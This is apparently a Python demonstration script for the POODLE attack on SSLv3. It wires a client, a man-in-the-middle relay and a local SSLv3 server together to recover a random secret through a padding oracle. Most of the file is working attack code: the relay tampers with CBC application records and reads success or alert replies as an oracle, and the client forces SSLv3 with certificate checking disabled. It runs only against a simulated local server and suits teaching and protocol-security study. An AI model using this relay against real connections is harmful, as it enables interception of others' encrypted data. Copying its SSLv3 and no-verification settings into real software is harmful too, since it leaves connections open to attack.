""" This sample shows how to exploit the POODLE vulnerability.
    Python 3.6 required.

    Note: The first block of data cannot be recovered, given how CBC works.
          For the purpose of this code, a calculated padding of 'AAAAAAAA' is used for first block.

    Note: This code won't work on systems having SSL-libraries without SSLv3.
    Example of a failure, when client doesn't support SSLv3 (unsupported protocol):
    openssl s_client -connect localhost:30001
    CONNECTED(00000003)
    error:14171102:SSL routines:tls_process_server_hello:unsupported protocol:ssl/statem/statem_clnt.c:917:
"""

import sys
import binascii
import struct
import asyncio
from contextlib import closing
import ssl
import logging
import random
import string
import time

sys.path.append('../src')
from poodle import POODLE

# Original: "SHA1+DES"
# OpenSSL docs: SHA1+DES represents all cipher suites containing the SHA1 and the DES algorithms
# $ openssl ciphers | tr : '\n' | sort | fgrep DES
ciphers_to_use = 'DES-CBC3-SHA'

certificate_pem_to_use = 'cert.pem'

# Create a logger
log = logging.getLogger()
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(message)s")
really_verbose_debugging = False  # This can be used to inspect the internal logic of this asynchronous application.


class PoodleClient(POODLE):
    def __init__(self, event_loop, server, secret):
        super().__init__()

        self.loop = event_loop
        self.server_info = server
        self.secret_to_use = secret
        self.send_bytes = None

    class PoodleProtocol(asyncio.Protocol):
        # For protocol examples, see: https://docs.python.org/3.4/library/asyncio-protocol.html#protocol-examples
        def __init__(self, client, received_data_future):
            self.client = client
            self.received_data = None
            self.transport = None
            self.received_data_future = received_data_future

        def connection_made(self, transport):
            self.transport = transport
            # See: https://docs.python.org/3/library/ssl.html#ssl.SSLSocket.cipher
            cipher_name, ssl_version, secret_bits = self.transport.get_extra_info('cipher')
            if 'CBC' not in cipher_name:
                raise RuntimeError(
                    "PoodleProtocol: This doesn't make any sense! Using cipher %s, but it doesn't do CBC block cipher!")
            if really_verbose_debugging:
                log.debug("PoodleProtocol::connection_made() Yes! Made connection! Sending bytes.")
            transport.write(self.client.send_bytes)

        def data_received(self, data):
            if really_verbose_debugging:
                log.debug('PoodleProtocol::data_received() "%s"' % data.decode('ASCII'))
            self.received_data = data

            # Close the transport, flush buffers, tear down TCP-connection
            if really_verbose_debugging:
                log.debug('PoodleProtocol::data_received() Done. Closing.')
            self.transport.close()

        def connection_lost(self, exc):
            # Disconnected, check how this went
            if not self.received_data:
                # Badly
                if really_verbose_debugging:
                    log.debug("PoodleProtocol::connection_lost() FAIL! Didn't receive any data from "
                              "that connection before closing!")
                self.received_data_future.set_exception(RuntimeError("No data from server!"))
            else:
                # Ok
                self.received_data_future.set_result(True)

    @staticmethod
    def _get_client_ssl_context():
        # For this, see: https://www.programcreek.com/python/example/72757/ssl.SSLContext
        options = ('OP_CIPHER_SERVER_PREFERENCE', 'OP_SINGLE_DH_USE',
                   'OP_SINGLE_ECDH_USE', 'OP_NO_COMPRESSION')
        context = ssl.SSLContext(ssl.PROTOCOL_SSLv3)
        context.verify_mode = ssl.CERT_NONE
        # reset protocol, options
        context.protocol = 0
        context.options = 0
        for o in options:
            context.options |= getattr(ssl, o, 0)
        context.set_ciphers(ciphers_to_use)

        return context

    def trigger(self, prefix, suffix=''):
        """
        class POODLE(object) will call trigger() when it needs to send anything.
        :param prefix: known prefix for sent data
        :param suffix: known suffix for sent data
        :return: the message as seen by class MitmTCPHandler() instance
        """

        self.message = None  # Clear any previous incoming message

        output = '%s|secret=%s|%s' % (prefix, self.secret_to_use, suffix)
        self.send_bytes = bytearray(output, 'ASCII')
        if really_verbose_debugging:
            log.debug("PoodleProtocol::trigger('%s', '%s'), output: %s, bytes: %s" %
                      (prefix, suffix, output, binascii.hexlify(self.send_bytes)))

        # Block here until sending is complete.
        # While looping, run also MITM and server.
        ssl_context = self._get_client_ssl_context()
        if really_verbose_debugging:
            log.debug('PoodleClient::trigger() SSLv3 connecting to %s:%d' % (self.server_info[0], self.server_info[1]))
        received_data_future = asyncio.Future()
        coro = self.loop.create_connection(lambda: PoodleClient.PoodleProtocol(self, received_data_future),
                                           self.server_info[0], self.server_info[1],
                                           ssl=ssl_context)

        ssl_socket = None
        try:
            ssl_socket, proto = self.loop.run_until_complete(coro)
        except (ConnectionResetError, ConnectionRefusedError, ConnectionAbortedError):
            log.error("trigger() Failed to connect!")
            received_data_future.cancel()
        except OSError as e:
            log.error("trigger() Something is not right with OS! Exception: %s" % e)
        else:
            # PoodleClient has made a connection and sent a request at this point.
            # Since we really don't care about the response, we could just stop here.
            # But we do block here until the entire stack is done its chores.
            try:
                self.loop.run_until_complete(received_data_future)
            except RuntimeError as e:
                if really_verbose_debugging:
                    print("trigger() darn! %s" % e)
            except asyncio.TimeoutError as e:
                log.error("trigger() TimeoutError ARGH! Error: %s" % e)

        # PoodleClient is done at this point.
        # If there are any pending tasks for the servers, wait until they're done.
        pending = asyncio.Task.all_tasks()
        self.loop.run_until_complete(asyncio.gather(*pending, loop=self.loop, return_exceptions=True))

        # Make sure the SSL-socket is really closed
        if ssl_socket:
            ssl_socket.close()

        if not self.message:
            print("trigger() FAIL! no message")
            return None

        if really_verbose_debugging:
            log.debug('PoodleClient::trigger() done')

        # Note: self.message is set by MitmTCPHandler() in a poodle.message_callback()
        return self.message


class MitmTCPHandler(object):
    def __init__(self, event_loop, mitm_server, real_server, poodle):
        super().__init__()

        self.loop = event_loop
        self.listen_info = mitm_server
        self.connect_info = real_server
        self.poodle = poodle
        self.server_socket = None

    class MitmServerProtocol(asyncio.Protocol):

        def __init__(self, mitm_handler, real_server):
            self.mitm_handler = mitm_handler
            self.loop = mitm_handler.loop
            self.connect_info = real_server
            self.transport = None
            self.client_lock = asyncio.Lock()
            self.client_lock_coro = None
            self.client_transport = None
            self.just_altered = None

            self.client_connect_timeout = 5  # seconds
            self.client_send_timeout = 5  # seconds

        def connection_made(self, transport):
            """
            Incoming connection to MITM server.
            :param transport: async transport to talk to client connecting to us
            :return: nothing
            """
            self.transport = transport
            self.just_altered = False
            if really_verbose_debugging:
                peername = self.transport.get_extra_info('peername')
                log.debug("MitmTCPHandler::MitmServerProtocol::connection_made() Connection from %s:%d" % (
                    peername[0], peername[1]))

            # Any data received from client will need to be sent to real server.
            # Note. The client has not sent any data yet, but in all likelihood it eventually will.
            # Get an asyncio.Lock() to prevent this server from sending data to real server,
            # until a connection has been established there.
            self.client_lock_coro = self.client_lock.acquire()
            asyncio.ensure_future(self.client_lock_coro).add_done_callback(self._got_client_lock)

        def _got_client_lock(self, task):
            task.result()  # True at this point, but call there will trigger any exceptions
            if really_verbose_debugging:
                log.debug("MitmTCPHandler::MitmServerProtocol::_got_client_lock()")

            coro = self.loop.create_connection(lambda: MitmTCPHandler.MitmClientProtocol(self),
                                               self.connect_info[0], self.connect_info[1])
            asyncio.ensure_future(asyncio.wait_for(coro,
                                                   self.client_connect_timeout, loop=self.loop
                                                   )).add_done_callback(self.connected_to_real_server)

        def connected_to_real_server(self, task):
            try:
                transport, client_object = task.result()
            except asyncio.TimeoutError:
                log.error('MitmTCPHandler::MitmServerProtocol::connected_to_real_server() failed to connect. '
                          'Exception: %s' % task.exception())
                self.transport.close()
                self.client_lock.release()
                return

            if self.transport.is_closing():
                transport.close()
                log.error('MitmTCPHandler::MitmServerProtocol::connected_to_real_server(), but server connection '
                          'is gone! Closing this new connection too.')
            else:
                self.client_transport = transport
                if really_verbose_debugging:
                    log.debug('MitmTCPHandler::MitmServerProtocol::connected_to_real_server()')
            self.client_lock.release()

        def data_received(self, data_in):
            """
            Handle data received from SSLv3 client.
            Relay it to real server. Altered, or unaltered.

            Info: Typical SSLv3 content types are:
            0x16 / 22 : Handshake: Client hello, Server hello, certificate
            0x17 / 23 : Application data
            0x15 / 21 : Alert
            :param data_in: the bytes received
            :return: None
            """

            # Note: It is completely normal for content type 23 packets to contain multiple blocks of data.
            header = data_in[:5]  # First 5 bytes are SSL-header
            data = data_in[5:]

            (content_type, version_major, version_minor, length) = struct.unpack('>BBBH', header)
            if really_verbose_debugging:
                peername = self.transport.get_extra_info('peername')
                log.debug(
                    "MitmTCPHandler::MitmServerProtocol::data_received() from %s:%d, SSL content type: %s, "
                    "Ver: %d.%d, Len: %d" %
                    (peername[0], peername[1], content_type, version_major, version_minor, length))
            if not (version_major == 3 and version_minor == 0):
                raise RuntimeError("This is not SSLv3!")
            # SSLv3 spec, Content type 23 = application data
            # The data length of 24 comes from the fact, that initial payloads contain only HMAC tag.
            # That is not the data we're interested in.
            if content_type == 23 and len(data) > 24:
                # This is the tricky part. Find the last block of data (if multiple exist)
                block_pointer = 0
                while len(data) > length:
                    block_pointer = 5 + length
                    header = data_in[block_pointer:5 + block_pointer]
                    data = data_in[5 + block_pointer:]
                    (content_type, version_major, version_minor, length) = struct.unpack('>BBBH', header)
                if block_pointer > 0:
                    # At this point data has the payload of last block.
                    # To make it possible to send the data, assume that "header" is the unaltered part.
                    if really_verbose_debugging:
                        log.debug(
                            "MitmServerProtocol::data_received(): last block header: %s is: "
                            "(content_type %d, version %d.%d, length %d), has %s bytes of data" %
                            (binascii.hexlify(header), content_type, version_major, version_minor, length, len(data)))
                    header = data_in[:5 + block_pointer]

                # Go tweak the data! Store the original for later use.
                self.just_altered, data_out = self.mitm_handler.poodle.message_callback(data)
            elif content_type == 21:
                # Client sent us alert! Close and quit.
                self.transport.close()
                return
            else:
                data_out = data

            # Pass it forward to real server:
            if really_verbose_debugging:
                log.debug('MitmTCPHandler::MitmServerProtocol::data_received() Sending to real server')
            message = header + data_out
            asyncio.ensure_future(self.send_to_real_server(message, self.client_send_timeout))

        def send_to_real_server(self, message, timeout=5.0):
            if really_verbose_debugging:
                log.debug('MitmTCPHandler::MitmServerProtocol::send_to_real_server() sending')
            # We will yield (sorta block) unless can acquire client_lock. This lock will be made available after
            # successful connection to real SSL-server.
            # In case the connection fails, lock will be acquired anyway, but client_transport won't be set.
            yield from self.client_lock.acquire()
            if self.client_transport:
                # Then wrap _send_to_real_server() with a timeout
                asyncio.ensure_future(asyncio.wait_for(self._send_to_real_server(message),
                                                       timeout, loop=self.loop)
                                      ).add_done_callback(self.sent_to_real_server)
            else:
                log.error('MitmTCPHandler::MitmServerProtocol::send_to_real_server() failed to send, no transport')
                self.client_lock.release()

        @asyncio.coroutine
        def _send_to_real_server(self, message):
            if really_verbose_debugging:
                log.debug('MitmTCPHandler::MitmServerProtocol::_send_to_real_server() sending')
            self.client_transport.write(message)

        def sent_to_real_server(self, task):
            try:
                # Just call result() to trigger any possible exception in the payload.
                task.result()
            except (TimeoutError, asyncio.TimeoutError):
                task.cancel()
                log.error('MitmTCPHandler::MitmServerProtocol::sent_to_real_server() failed to send, timeout')
                if self.client_transport:
                    self.client_transport.close()
                self.transport.close()
            else:
                if really_verbose_debugging:
                    log.debug('MitmTCPHandler::MitmServerProtocol::sent_to_real_server()')
            self.client_lock.release()

        def connection_lost(self, exc):
            if really_verbose_debugging:
                peername = self.transport.get_extra_info('peername')
                log.debug('MitmTCPHandler::MitmServerProtocol::connection_lost() The client %s:%d closed the connection'
                          % (peername[0], peername[1]))

    class MitmClientProtocol(asyncio.Protocol):
        def __init__(self, server):
            self.server = server
            self.transport = None

        def connection_made(self, transport):
            if really_verbose_debugging:
                peername = transport.get_extra_info('peername')
                log.debug("MitmTCPHandler::MitmClientProtocol::connection_made() Connection to %s:%d ok." % (
                    peername[0], peername[1]))
            self.transport = transport

        def data_received(self, data):
            if self.server.just_altered:
                (content_type, version_major, version_minor, length) = struct.unpack('>BBBH', data[:5])
                if really_verbose_debugging:
                    log.debug(
                        "MitmClientProtocol::data_received() is: (content_type %d, version %d.%d,"
                        " length %d, altered: data: %s )" %
                        (content_type, version_major, version_minor, length, binascii.hexlify(data)))
                if self.server.mitm_handler.poodle:
                    if content_type == 23:  # SSLv3 spec, Content type app data
                        # server response message: decryption worked!
                        self.server.mitm_handler.poodle.mark_success()
                    if content_type == 21:  # SSLv3 spec, Content type alert
                        # bad mac alert
                        self.server.mitm_handler.poodle.mark_error()
                self.server.just_altered = False
            else:
                if really_verbose_debugging:
                    (content_type, version_major, version_minor, length) = struct.unpack('>BBBH', data[:5])
                    log.debug(
                        "MitmClientProtocol::data_received() is: (content_type %d, version %d.%d,"
                        " length %d, unaltered: data: %s )" %
                        (content_type, version_major, version_minor, length, binascii.hexlify(data)))

            # Pass the received data via server to PoodleClient
            # Note: Really! We write to the other protocol's transport. Not our own.
            if really_verbose_debugging:
                log.debug("MitmTCPHandler::MitmClientProtocol::data_received() Sending back to client.")
            self.server.transport.write(data)

        def connection_lost(self, exc):
            if not self.server.just_altered:
                log.debug('MitmTCPHandler::MitmClientProtocol::connection_lost() The server closed the connection'
                          ' and no altered data was transmitted.')
            else:
                # We're hacking ... server doesn't love our requests.
                if really_verbose_debugging:
                    log.debug("MitmTCPHandler::MitmClientProtocol::connection_lost() Server doesn't love us.")
                self.server.mitm_handler.poodle.mark_error()
                # Notify MITM-server, that this went south.
                self.server.transport.close()

    def run_server(self):
        log.debug('MitmTCPHandler::run_server() Spinning up a new MITM-server to %s:%d' % (
            self.listen_info[0], self.listen_info[1]))
        # Each client connection will create a new protocol instance
        coro = self.loop.create_server(lambda: MitmTCPHandler.MitmServerProtocol(self, self.connect_info),
                                       self.listen_info[0], self.listen_info[1])
        # Block here until the server is really up
        self.server_socket = self.loop.run_until_complete(coro)


class SecureTCPHandler(object):
    def __init__(self, event_loop, real_server):
        super().__init__()

        self.loop = event_loop
        self.listen_info = real_server
        self.server_socket = None

    class SSLServerProtocol(asyncio.Protocol):

        def __init__(self, loop):
            self.loop = loop
            self.transport = None

        def connection_made(self, transport):
            self.transport = transport
            cipher_name, ssl_version, secret_bits = self.transport.get_extra_info('cipher')
            if 'CBC' not in cipher_name:
                raise RuntimeError(
                    "SSLServerProtocol: This doesn't make any sense! "
                    "Using cipher %s, but it doesn't do CBC block cipher!")
            if really_verbose_debugging:
                peername = self.transport.get_extra_info('peername')
                log.debug("SecureTCPHandler::SSLServerProtocol() Connection from %s:%d" % (peername[0], peername[1]))

        def data_received(self, data):
            if really_verbose_debugging:
                peername = self.transport.get_extra_info('peername')
                log.debug("SecureTCPHandler::SSLServerProtocol::data_received() from %s:%d: %s" %
                          (peername[0], peername[1], data))
            # Ignore data, just reply ok.
            self.transport.write(b'ok')
            self.transport.close()

        def connection_lost(self, exc):
            if really_verbose_debugging:
                peername = self.transport.get_extra_info('peername')
                if not peername:
                    # This happens especially, when sending crafted SSL-packets
                    peername = ['Nobody', -1]
                log.debug('SecureTCPHandler::SSLServerProtocol::connection_lost() The client %s:%d closed'
                          ' the connection' % (peername[0], peername[1]))

    @staticmethod
    def _get_server_ssl_context():
        # For this, see: https://www.programcreek.com/python/example/72757/ssl.SSLContext
        options = ('OP_CIPHER_SERVER_PREFERENCE', 'OP_SINGLE_DH_USE',
                   'OP_SINGLE_ECDH_USE', 'OP_NO_COMPRESSION')
        context = ssl.SSLContext(ssl.PROTOCOL_SSLv3)
        context.verify_mode = ssl.CERT_NONE
        # reset protocol, options
        context.protocol = 0
        context.options = 0
        for o in options:
            context.options |= getattr(ssl, o, 0)
        context.set_ciphers(ciphers_to_use)
        context.load_cert_chain(certificate_pem_to_use, certificate_pem_to_use)

        return context

    def run_server(self):
        log.debug('SecureTCPHandler::run_server() Spinning up a new SSLv3-server to %s:%d' % (
            self.listen_info[0], self.listen_info[1]))
        # Each client connection will create a new protocol instance
        coro = self.loop.create_server(lambda: SecureTCPHandler.SSLServerProtocol(self),
                                       self.listen_info[0], self.listen_info[1],
                                       ssl=self._get_server_ssl_context())
        # Block here until the server is really up
        self.server_socket = self.loop.run_until_complete(coro)


def list_ciphers():
    """
    List available ciphers. See global variable: ciphers_to_use
    Running:
    $ openssl ciphers | tr : '\n' | sort | fgrep DES
    will return different list than Python built-in SSL-library.
    :return:
    """
    version = ssl.PROTOCOL_SSLv3
    context = ssl.SSLContext(version)
    cipher_stack = context.get_ciphers()
    print("List of available ciphers:")
    for cipher in cipher_stack:
        print("%s: %s\t%s" % (cipher['protocol'], cipher['name'], cipher['description']))
    print("done")


def main():
    ## List available ciphers:
    # return list_ciphers()

    # Generate a random string to transmit
    secret = ''.join([random.choice(string.printable) for c in range(25)])

    ssl_server_host, ssl_server_port = "0.0.0.0", 30001
    mitm_host, mitm_port_to_listen = "0.0.0.0", 30002

    print('THE SECRET IS "%s", hex: %s' % (secret, secret.encode("utf-8").hex()))

    # Start
    with closing(asyncio.get_event_loop()) as loop:
        # Debugging the internals of event loop:
        # loop.set_debug(True)

        # Construct a PoodleClient. It knows about the POODLE-flaw and can transmit to given server.
        poodle = PoodleClient(loop, (mitm_host, mitm_port_to_listen), secret)

        # Construct a MitmTCPHandler. It receives SSLv3-requests from PoodleClient() and
        # relays modified queries to server.
        man_in_the_middle = MitmTCPHandler(loop, (mitm_host, mitm_port_to_listen),
                                           (ssl_server_host, ssl_server_port), poodle)
        man_in_the_middle.run_server()

        # Construct a SecureTCPHandler. It receives SSLv3-requests from MitmTCPHandler().
        # This simulates the target server. It returns "ok" to all requests.
        sslv3_server = SecureTCPHandler(loop, (ssl_server_host, ssl_server_port))
        sslv3_server.run_server()

        ## Testing the MITM-scaffolding without POODLE
        # return loop.run_forever()

        log.info('Running poodle-exploit')
        plaintext = None
        start_time = None
        end_time = None
        if poodle.detect_block_info():
            log.info("Found block edge: %u, block size: %d bytes, recovery length: %d bytes, going for exploit!" %
                     (poodle.block_edge, poodle.block_size, poodle.recovery_length))
            start_time = time.time()
            plaintext = poodle.exploit()
            end_time = time.time()
        else:
            log.error("Detecting server parameters failed. Cannot continue to exploit-phase.")

        # If there are any pending tasks for the servers, wait until they're done.
        loop.run_until_complete(loop.shutdown_asyncgens())

        sslv3_server.server_socket.close()
        man_in_the_middle.server_socket.close()

        # A failure?
        if not plaintext:
            log.info("Done running poodle. Plaintext could not be recovered.")
        else:
            # Since there is no real way of knowing the actual length of original secret,
            # the plaintext will very likely have extra characters at the end.
            log.info('Done running poodle in %f seconds.\nPlaintext is: "%s" (omit the possible garbage at the end)\n'
                     'Plaintext in hex: %s' %
                     (end_time - start_time, ''.join(plaintext),
                      binascii.hexlify(bytearray([ord(c[0]) for c in plaintext]))))


if __name__ == "__main__":
    main()
